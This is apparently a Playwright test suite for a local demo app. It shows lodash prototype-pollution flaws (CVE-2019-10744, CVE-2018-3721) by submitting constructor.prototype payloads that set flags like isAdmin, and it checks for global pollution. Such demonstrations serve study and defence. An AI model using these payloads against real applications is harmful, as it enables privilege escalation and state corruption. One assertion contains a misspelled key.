const { test, expect } = require('@playwright/test');

// Helper function to start the server
let server;

test.beforeAll(async () => {
  // Import and start the server
  const app = require('./server');
  server = app.listen(3001, () => {
    console.log('Test server running on port 3001');
  });
});

test.afterAll(async () => {
  if (server) {
    server.close();
  }
});

test.describe('Lodash Vulnerability Demonstration', () => {
  
  test('should demonstrate CVE-2019-10744 via defaultsDeep', async ({ page }) => {
    // Navigate to the application
    await page.goto('http://localhost:3001');
    
    // Check initial status - should not be polluted
    await page.click('button:has-text("Check Current Status")');
    await expect(page.locator('#status-response')).toContainText('"prototypePolluded": false');
    
    // Test defaultsDeep vulnerability
    await page.fill('#defaultsDeepPayload', '{"constructor": {"prototype": {"isAdmin": true}}}');
    await page.click('button:has-text("Test defaultsDeep Vulnerability")');
    
    // Wait for response and verify exploitation
    await page.waitForSelector('#defaultsDeep-response', { state: 'visible' });
    const response = await page.locator('#defaultsDeep-response').textContent();
    const responseData = JSON.parse(response);
    
    expect(responseData.success).toBe(true);
    expect(responseData.prototypePolluded).toBe(true);
    expect(responseData.isAdmin).toBe(true);
    
    // Verify global prototype pollution
    await page.click('button:has-text("Check Current Status")');
    await expect(page.locator('#status-response')).toContainText('"prototypePolluted": true');
    await expect(page.locator('#status-response')).toContainText('"isAdmin": true');
  });

  test('should demonstrate CVE-2018-3721 via merge', async ({ page }) => {
    // Navigate to the application and reset prototype
    await page.goto('http://localhost:3001');
    await page.click('button:has-text("Reset Prototype")');
    
    // Test merge vulnerability
    await page.fill('#mergePayload', '{"constructor": {"prototype": {"polluted": "via merge"}}}');
    await page.click('button:has-text("Test merge Vulnerability")');
    
    // Wait for response and verify exploitation
    await page.waitForSelector('#merge-response', { state: 'visible' });
    const response = await page.locator('#merge-response').textContent();
    const responseData = JSON.parse(response);
    
    expect(responseData.success).toBe(true);
    expect(responseData.prototypePolluted).toBe(true);
    
    // Verify global prototype pollution
    await page.click('button:has-text("Check Current Status")');
    await page.waitForSelector('#status-response', { state: 'visible' });
    const statusResponse = await page.locator('#status-response').textContent();
    expect(statusResponse).toContain('"prototypePolluted": true');
  });

  test('should demonstrate CVE-2018-3721 via mergeWith', async ({ page }) => {
    // Navigate to the application and reset prototype
    await page.goto('http://localhost:3001');
    await page.click('button:has-text("Reset Prototype")');
    
    // Test mergeWith vulnerability
    await page.fill('#mergeWithPayload', '{"constructor": {"prototype": {"isHacked": "yes"}}}');
    await page.click('button:has-text("Test mergeWith Vulnerability")');
    
    // Wait for response and verify exploitation
    await page.waitForSelector('#mergeWith-response', { state: 'visible' });
    const response = await page.locator('#mergeWith-response').textContent();
    const responseData = JSON.parse(response);
    
    expect(responseData.success).toBe(true);
    expect(responseData.prototypePolluted).toBe(true);
    
    // Verify global prototype pollution
    await page.click('button:has-text("Check Current Status")');
    await page.waitForSelector('#status-response', { state: 'visible' });
    const statusResponse = await page.locator('#status-response').textContent();
    expect(statusResponse).toContain('"prototypePolluted": true');
  });

  test('should demonstrate API endpoint vulnerability', async ({ request }) => {
    // Test the API directly without the UI
    const pollutionPayload = {
      constructor: {
        prototype: {
          apiTest: true
        }
      }
    };

    // Test defaultsDeep API
    const response = await request.post('http://localhost:3001/api/defaults-deep', {
      data: pollutionPayload
    });
    
    const responseData = await response.json();
    expect(responseData.success).toBe(true);
    expect(responseData.prototypePolluted).toBe(true);
    expect(responseData.isAdmin).toBe(true);

    // Verify status endpoint shows pollution
    const statusResponse = await request.get('http://localhost:3001/api/status');
    const statusData = await statusResponse.json();
    expect(statusData.prototypePolluted).toBe(true);
  });

  test('should take screenshots for documentation', async ({ page }) => {
    // Navigate to the application
    await page.goto('http://localhost:3001');
    
    // Take screenshot of the initial page
    await page.screenshot({ path: 'screenshots/initial-page.png', fullPage: true });
    
    // Reset prototype to ensure clean state
    await page.click('button:has-text("Reset Prototype")');
    await page.waitForSelector('#status-response', { state: 'visible' });
    
    // Take screenshot showing clean state
    await page.screenshot({ path: 'screenshots/clean-state.png', fullPage: true });
    
    // Demonstrate defaultsDeep vulnerability
    await page.fill('#defaultsDeepPayload', '{"constructor": {"prototype": {"isAdmin": true}}}');
    await page.click('button:has-text("Test defaultsDeep Vulnerability")');
    await page.waitForSelector('#defaultsDeep-response', { state: 'visible' });
    
    // Take screenshot showing vulnerability exploitation
    await page.screenshot({ path: 'screenshots/vulnerability-exploited.png', fullPage: true });
    
    // Check status to show global prototype pollution
    await page.click('button:has-text("Check Current Status")');
    await page.waitForSelector('#status-response', { state: 'visible' });
    
    // Take final screenshot showing global pollution
    await page.screenshot({ path: 'screenshots/global-pollution.png', fullPage: true });
  });
});